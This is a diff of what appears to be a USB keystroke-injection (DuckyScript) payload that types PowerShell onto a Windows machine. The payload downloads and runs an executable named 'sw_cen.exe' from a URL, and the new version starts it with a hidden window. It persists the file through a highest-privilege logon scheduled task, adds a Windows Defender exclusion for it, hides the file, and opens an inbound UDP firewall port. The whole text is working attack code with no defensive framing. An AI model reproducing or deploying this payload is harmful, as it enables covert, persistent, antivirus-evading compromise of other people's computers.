@@ -16,24 +16,37 @@ STRING $output = "$env:USERPROFILE\AppData\Local\sw_cen.exe"
 ENTER
 DELAY 250
 STRING $destination = "$env:USERPROFILE\AppData\Local"
-ENTER 
+ENTER
 DELAY 250
 STRING Set-Location -Path $destination
 ENTER
 DELAY 250
-STRING Invoke-WebRequest -Uri $url -OutFile $output ; if($?) { Start-Process ".\sw_cen.exe" }
-ENTER
-DELAY 250
-DELAY 500
-STRING if($?) {Register-ScheduledTask -TaskName "sw_cen" -Action (New-ScheduledTaskAction -Execute $output) -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Principal (New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable) -Force}
-ENTER
-DELAY 250
-STRING if($?) {Add-MpPreference -ExclusionProcess $output}
-ENTER
-DELAY 250
-DELAY 50
-STRING if($?) {Set-ItemProperty -LiteralPath $output -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) }
+STRING Stop-Process -Name "sw_cen" -Force -ErrorAction SilentlyContinue
 ENTER
 DELAY 500
-STRING if($?) {exit}
+STRING Invoke-WebRequest -Uri $url -OutFile $output
+ENTER
+DELAY 250
+STRING $ok = $?
+ENTER
+DELAY 250
+STRING Remove-NetFirewallRule -DisplayName "sw_cen" -ErrorAction SilentlyContinue
+ENTER
+DELAY 250
+STRING New-NetFirewallRule -DisplayName "sw_cen" -Direction Inbound -Protocol UDP -LocalPort 7878 -Action Allow -Profile Any -ErrorAction SilentlyContinue
+ENTER
+DELAY 250
+STRING if($ok) {Start-Process -WindowStyle Hidden $output}
+ENTER
+DELAY 250
+STRING if($ok) {Register-ScheduledTask -TaskName "sw_cen" -Action (New-ScheduledTaskAction -Execute $output) -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Principal (New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable) -Force}
+ENTER
+DELAY 250
+STRING if($ok) {Add-MpPreference -ExclusionProcess $output}
+ENTER
+DELAY 250
+STRING if($ok) {Set-ItemProperty -LiteralPath $output -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)}
+ENTER
+DELAY 500
+STRING if($ok) {exit}
 ENTER
